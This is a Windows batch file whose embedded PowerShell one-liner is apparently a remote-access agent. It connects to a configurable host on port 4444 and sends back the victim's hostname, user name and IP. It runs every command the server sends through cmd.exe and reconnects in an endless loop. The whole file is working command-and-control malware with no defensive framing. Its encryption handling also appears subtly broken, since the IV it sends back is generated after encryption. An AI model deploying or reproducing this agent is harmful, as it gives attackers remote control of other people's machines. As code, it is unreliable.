@echo off
setlocal enabledelayedexpansion

set SERVER_HOST=0.0.0.0
set SERVER_PORT=4444

:CONNECT
echo [*] Connecting to %SERVER_HOST%:%SERVER_PORT%
powershell -Command "$client = New-Object System.Net.Sockets.TcpClient; try { $client.Connect('%SERVER_HOST%', %SERVER_PORT%); $stream = $client.GetStream(); $key = New-Object byte[] 1024; $i = $stream.Read($key, 0, $key.Length); $keyStr = [System.Text.Encoding]::UTF8.GetString($key, 0, $i); $hostname = $env:COMPUTERNAME; $user = $env:USERNAME; $os = 'Windows'; $arch = $env:PROCESSOR_ARCHITECTURE; $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike '*Loopback*' -and $_.InterfaceAlias -notlike '*VMware*'} | Select-Object -First 1).IPAddress; if (-not $localIP) { $s = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Dgram, [System.Net.Sockets.ProtocolType]::Udp); try { $s.Connect('8.8.8.8', 80); $localIP = $s.LocalEndPoint.Address.ToString(); } finally { $s.Close(); } } $info = @{os=$os; hostname=$hostname; user=$user; architecture=$arch; agentIP=$localIP} | ConvertTo-Json -Compress; $infoBytes = [System.Text.Encoding]::UTF8.GetBytes($info); $stream.Write($infoBytes, 0, $infoBytes.Length); $stream.Flush(); [System.Threading.Thread]::Sleep(500); echo '[+] Connected!'; while ($true) { $buffer = New-Object byte[] 8192; $bytesRead = $stream.Read($buffer, 0, $buffer.Length); if ($bytesRead -eq 0) { break; } $cipher = New-Object System.Security.Cryptography.AesManaged; $cipher.Mode = [System.Security.Cryptography.CipherMode]::CBC; $cipher.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7; $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($keyStr.Substring(0, 32)); $cipher.Key = $keyBytes; $iv = New-Object byte[] 16; [Array]::Copy($buffer, 0, $iv, 0, 16); $cipher.IV = $iv; $decryptor = $cipher.CreateDecryptor(); $encData = New-Object byte[] ($bytesRead - 16); [Array]::Copy($buffer, 16, $encData, 0, $encData.Length); $decrypted = $decryptor.TransformFinalBlock($encData, 0, $encData.Length); $command = [System.Text.Encoding]::UTF8.GetString($decrypted); echo \"[+] Command: $command\"; $output = ''; if ($command -eq 'SYSINFO') { $output = \"OS: $os`nHostname: $hostname`nUser: $user`nArch: $arch`nAgent IP: $localIP\"; } elseif ($command -eq 'SCREENSHOT') { $output = 'ERROR: Screenshot not supported in batch agent'; } else { try { $result = cmd /c $command 2>&1; $output = $result -join \"`n\"; if ([string]::IsNullOrEmpty($output)) { $output = 'Command executed (no output)'; } } catch { $output = \"ERROR: $_\"; } } $outputBytes = [System.Text.Encoding]::UTF8.GetBytes($output); $encryptor = $cipher.CreateEncryptor(); $cipher.GenerateIV(); $encBytes = $encryptor.TransformFinalBlock($outputBytes, 0, $outputBytes.Length); $response = New-Object byte[] ($cipher.IV.Length + $encBytes.Length + 5); [Array]::Copy($cipher.IV, 0, $response, 0, $cipher.IV.Length); [Array]::Copy($encBytes, 0, $response, $cipher.IV.Length, $encBytes.Length); [Array]::Copy([System.Text.Encoding]::ASCII.GetBytes('<END>'), 0, $response, $cipher.IV.Length + $encBytes.Length, 5); $stream.Write($response, 0, $response.Length); $stream.Flush(); } } catch { echo \"[-] Connection failed: $_\"; } finally { if ($client) { $client.Close(); } } echo '[*] Disconnected. Reconnecting in 5 seconds...'; Start-Sleep -Seconds 5;"
goto CONNECT